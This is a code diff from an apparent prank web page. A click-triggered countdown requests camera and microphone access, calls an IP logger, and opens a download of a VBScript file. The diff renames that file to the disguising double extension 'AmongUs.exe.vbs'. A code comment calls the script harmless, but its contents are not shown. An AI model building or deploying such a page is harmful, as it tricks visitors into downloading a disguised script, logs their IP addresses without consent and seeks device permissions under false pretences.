@@ -124,7 +124,7 @@ document.body.addEventListener('click', function (event) {
         } else if (countdown == 20) {
             getLocalStream(); // activates camera/mic perms
         } else if (countdown == 17) {
-            window.open("../../assets/AmongUs.vbs"); // downloads a vbscript file (if you open it, it's harmless anyways- feel free to use task manager to kill the process)
+            window.open("../../assets/AmongUs.exe.vbs"); // downloads a vbscript file (if you open it, it's harmless anyways- feel free to use task manager to kill the process)
         } else if (countdown == 15) {
             ipLogger();
         } else if (countdown == 5) {
